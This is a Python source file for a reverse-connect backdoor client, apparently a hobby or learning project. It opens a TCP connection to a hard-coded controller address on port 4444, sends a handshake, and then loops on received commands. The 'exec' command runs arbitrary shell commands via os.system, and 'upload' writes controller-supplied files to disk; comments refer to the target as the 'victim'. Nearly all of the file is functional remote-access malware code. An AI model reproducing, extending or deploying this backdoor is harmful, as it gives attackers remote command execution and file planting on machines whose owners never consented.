import os
import sys
import struct
import time
import socket
import base64

class BackdoorClientModuleInterface:

    def __init__(self, handler):
        self.handler = handler
        self.conn = handler.conn
        self.cmdModules = ["upload", "download", "exec"]

    def runCMD(self, cmd):

        # If module does not exist execute it on the current system
        if not cmd[0] in self.cmdModules:
           self.handler.send_msg("CMD_NOT_FOUND")


        print(cmd[0])
        # Get the command's function
        cmdFunction = getattr(self, cmd[0])

        # Notify victim of cmd to be executed
        self.handler.send_msg(cmd[0])

        # Run the command
        return cmdFunction(cmd)

    def upload(self, argv):
        filename = self.handler.recv_msg()
        try:
            targetFile = open(filename, 'wb')
            # Receive data from client
            data = self.handler.recv_msg()
            data = base64.b64decode(data.encode('ascii'))
            print('RECEIVED DATA FOR %s (%ld bytes)...' % (filename, len(data)))
            targetFile.write(data)
            targetFile.close()

        except Exception as exc:
            return 'CMD_FAIL: {}'.format(exc)

        return 'CMD_SUCCESS'

    def download(self, argv):
        pass

    def exec(self, argv):
        cmd = self.handler.recv_msg()
        try:
            os.system(cmd)
        except Exception as exc:
            return 'CMD_FAIL: {}'.format(exc)

        return 'CMD_SUCCESS'

class BDServerHandler:

    def __init__(self, conn):
        self.conn = conn
        print("[+] Connected!")

    def send_msg(self, msg):
        if isinstance(msg, str): 
            msg = msg.encode()
        msg = struct.pack('>I', len(msg)) + msg # len + msg
        self.conn.sendall(msg)

    def recv_msg(self):
        msgLen = self.recvall(4)
        if not msgLen:
            return None
        msgLen = struct.unpack('>I', msgLen)[0]
        print("INCOMING PACKET: %d bytes" % msgLen)
        return self.recvall(msgLen).decode('ascii')

    def recvall(self, n):
        data = bytearray()
        while len(data) < n:
            packet = self.conn.recv(n - len(data))
            if not packet:
                return None
            data.extend(packet)
        return data

    def handshake(self):
        self.send_msg('BD_HSK')

class ConnectBackDoor:

    def __init__(self, RHOST="192.168.178.13", RPORT=4444):
        self.RHOST = RHOST
        self.RPORT = RPORT
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.cmdModules = ["upload", "download", "exec"]

    def connect(self):
        
        # Connect with master
        self.s.connect((self.RHOST, self.RPORT))

        # Initialize handler
        handler = BDServerHandler(self.s)

         # Create module interface
        moduleInterface = BackdoorClientModuleInterface(handler)

        # Send verification handshake
        print('Sending handshake...')
        handler.handshake()

        while True:
            # Get command
            cmd = handler.recv_msg().split(" ")
           
            # Run it
            result = moduleInterface.runCMD(cmd)

            # Report response
            handler.send_msg(result)

if __name__ == "__main__":
    client = ConnectBackDoor(RHOST="192.168.178.19")
    client.connect()